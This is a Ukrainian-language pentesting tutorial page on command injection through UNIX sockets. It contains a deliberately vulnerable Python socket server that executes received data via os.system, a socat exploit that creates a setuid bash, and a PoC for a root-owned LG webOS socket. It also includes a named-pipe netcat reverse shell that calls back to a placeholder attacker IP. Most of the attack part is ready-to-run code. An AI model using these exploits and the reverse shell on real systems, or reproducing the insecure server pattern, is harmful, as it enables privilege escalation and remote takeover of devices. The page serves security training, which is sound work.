# Ін'єкція команд через сокет

{{#include ../../banners/hacktricks-training.md}}

## Приклад прив'язування сокета за допомогою Python

У наведеному прикладі **створюється unix socket** (`/tmp/socket_test.s`), і все **отримане** буде **виконано** за допомогою `os.system`. Я знаю, що ви навряд чи знайдете щось подібне у wild, але мета цього прикладу — показати, як виглядає код, що використовує unix sockets, і як обробляти вхідні дані в найгіршому можливому випадку.
```python:s.py
import socket
import os, os.path
import time
from collections import deque

if os.path.exists("/tmp/socket_test.s"):
os.remove("/tmp/socket_test.s")

server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
server.bind("/tmp/socket_test.s")
os.system("chmod o+w /tmp/socket_test.s")
while True:
server.listen(1)
conn, addr = server.accept()
datagram = conn.recv(1024)
if datagram:
print(datagram)
os.system(datagram)
conn.close()
```
**Виконайте** код за допомогою Python: `python s.py` і **перевірте, як прослуховується сокет**:
```python
netstat -a -p --unix | grep "socket_test"
(Not all processes could be identified, non-owned process info
will not be shown, you would have to be root to see it all.)
unix  2      [ ACC ]     STREAM     LISTENING     901181   132748/python        /tmp/socket_test.s
```
**Exploit**
```python
echo "cp /bin/bash /tmp/bash; chmod +s /tmp/bash; chmod +x /tmp/bash;" | socat - UNIX-CLIENT:/tmp/socket_test.s
```
## Приклад: ескалація, ініційована сигналом через UNIX socket, власником якого є root (LG webOS)

Деякі привілейовані демони відкривають UNIX socket, власником якого є root, приймають недовірені вхідні дані та пов’язують привілейовані дії з ідентифікаторами потоків і сигналами. Якщо протокол дає непривілейованому клієнту змогу впливати на те, який native thread буде ціллю, можна активувати привілейований code path і виконати ескалацію.<sup>[[1]](#references)[[2]](#references)</sup>

Основний write-up і disclosure описують наведену нижче послідовність.<sup>[[1]](#references)[[2]](#references)</sup>

Спостережувана схема:
- Підключитися до UNIX socket, власником якого є root (наприклад, /tmp/remotelogger).
- Створити thread і отримати його native thread id (TID).
- Надіслати TID (у packed-форматі) разом із padding як запит; отримати підтвердження.
- Надіслати певний signal до цього TID, щоб активувати привілейовану поведінку.

Наведений нижче стислий PoC відтворює цю послідовність.<sup>[[1]](#references)[[2]](#references)</sup>
Мінімальний начерк PoC:
```python
import socket, struct, os, threading, time
# Spawn a thread so we have a TID we can signal
th = threading.Thread(target=time.sleep, args=(600,)); th.start()
tid = th.native_id  # Python >=3.8
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
s.connect("/tmp/remotelogger")
s.sendall(struct.pack('<L', tid) + b'A'*0x80)
s.recv(4)  # sync
os.kill(tid, 4)  # deliver SIGILL (example from the case)
```
Щоб перетворити це на root shell, можна використати простий шаблон named-pipe + nc.<sup>[[2]](#references)</sup>
```bash
rm -f /tmp/f; mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc <ATTACKER-IP> 23231 > /tmp/f
```
- Цей клас bugs виникає через довіру до значень, отриманих зі стану непривілейованого клієнта (TIDs), і їх прив’язування до привілейованих обробників сигналів або логіки.<sup>[[1]](#references)</sup>
- Посильте захист, застосовуючи перевірку облікових даних на socket, валідуючи формати повідомлень і відокремлюючи привілейовані операції від зовнішніх ідентифікаторів потоків.

## References

- [1] [Jailbreak webOS заради розваги (просто заради розваги)](https://ut.buglloc.com/2025/01/webos-jailbreak/)
- [2] [Обхід каталогів, обхід автентифікації та повне захоплення пристрою LG WebOS TV (розкриття SSD)](https://ssd-disclosure.com/lg-webos-tv-path-traversal-authentication-bypass-and-full-device-takeover/)
{{#include ../../banners/hacktricks-training.md}}
